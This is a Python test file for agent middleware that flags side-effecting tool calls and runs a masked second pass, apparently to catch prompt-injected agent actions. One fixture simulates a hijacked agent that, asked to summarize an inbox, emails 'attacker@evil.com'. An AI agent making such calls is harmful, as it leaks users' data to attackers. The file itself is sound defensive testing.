from middleware.melon.engine import run_melon_check
from middleware.melon.prefilter import is_sensitive, should_run_melon_check
from middleware.melon.types import ToolCall


def test_is_sensitive_matches_side_effecting_tool_names():
    assert is_sensitive(ToolCall(name="send_email", arguments={}))
    assert is_sensitive(ToolCall(name="delete_file", arguments={}))
    assert is_sensitive(ToolCall(name="transfer_funds", arguments={}))


def test_is_sensitive_false_for_read_only_tool_names():
    assert not is_sensitive(ToolCall(name="read_calendar", arguments={}))
    assert not is_sensitive(ToolCall(name="search_inbox", arguments={}))
    assert not is_sensitive(ToolCall(name="list_files", arguments={}))


def test_should_run_melon_check_true_if_any_call_is_sensitive():
    calls = [
        ToolCall(name="read_calendar", arguments={}),
        ToolCall(name="send_email", arguments={}),
    ]
    assert should_run_melon_check(calls) is True


def test_should_run_melon_check_false_if_no_calls():
    assert should_run_melon_check([]) is False


def test_should_run_melon_check_false_if_all_calls_read_only():
    calls = [
        ToolCall(name="read_calendar", arguments={}),
        ToolCall(name="list_files", arguments={}),
    ]
    assert should_run_melon_check(calls) is False


def test_run_melon_check_skips_masked_run_when_not_sensitive():
    call_log: list[list[dict]] = []

    def fake_agent_call_fn(state: list[dict]) -> list[ToolCall]:
        call_log.append(state)
        return [ToolCall(name="read_calendar", arguments={"date": "tomorrow"})]

    verdict = run_melon_check(state=[{"role": "user", "content": "check my calendar"}], agent_call_fn=fake_agent_call_fn)

    assert verdict.ran is False
    assert verdict.verdict == "safe"
    assert verdict.distance is None
    assert len(call_log) == 1, "masked run should not have been invoked"


def test_run_melon_check_runs_masked_pass_when_sensitive():
    call_log: list[list[dict]] = []

    def fake_agent_call_fn(state: list[dict]) -> list[ToolCall]:
        call_log.append(state)
        return [ToolCall(name="send_email", arguments={"to": "attacker@evil.com", "body": "x"})]

    verdict = run_melon_check(state=[{"role": "user", "content": "summarize my inbox"}], agent_call_fn=fake_agent_call_fn)

    assert verdict.ran is True
    assert len(call_log) == 2, "masked run should have been invoked"
